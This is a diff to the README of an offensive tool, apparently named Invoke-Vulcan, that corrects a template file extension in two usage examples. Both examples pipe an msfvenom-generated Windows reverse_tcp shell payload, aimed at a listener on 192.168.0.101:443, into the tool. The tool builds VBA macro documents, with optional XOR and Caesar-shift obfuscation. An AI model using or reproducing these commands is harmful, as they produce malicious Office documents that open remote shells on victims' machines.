@@ -65,7 +65,7 @@ Users/stargazers are greatly encouraged toward contributing to improving and ext
 
     ```powershell
     wsl --exec msfvenom -p windows/shell/reverse_tcp LHOST=192.168.0.101 LPORT=443 EXITFUNC=thread -f hex | 
-            Invoke-Vulcan -OutputDirectory ".\winwords\" -Template ".\assets\templates\indirect.Visual Basic"
+            Invoke-Vulcan -OutputDirectory ".\winwords\" -Template ".\assets\templates\indirect.vba"
     ```
 
 > Although obvious, `windows/shell/reverse_tcp LHOST=192.168.0.101 LPORT=443 EXITFUNC=thread` is a placeholder for your own values... 🙄
@@ -74,7 +74,7 @@ Users/stargazers are greatly encouraged toward contributing to improving and ext
 
     ```powershell
     wsl --exec msfvenom -p windows/shell/reverse_tcp LHOST=192.168.0.101 LPORT=443 EXITFUNC=thread -f hex | 
-            Invoke-Vulcan -OutputDirectory ".\winwords\" -Template ".\assets\templates\indirect.Visual Basic" -Decoder xor -DecoderPath ".\assets\decoders\xor.vba" -CaesarShift 5
+            Invoke-Vulcan -OutputDirectory ".\winwords\" -Template ".\assets\templates\indirect.vba" -Decoder xor -DecoderPath ".\assets\decoders\xor.vba" -CaesarShift 5
     ```
 
 > Although obvious, `windows/shell/reverse_tcp LHOST=192.168.0.101 LPORT=443 EXITFUNC=thread` is a placeholder for your own values... 🙄
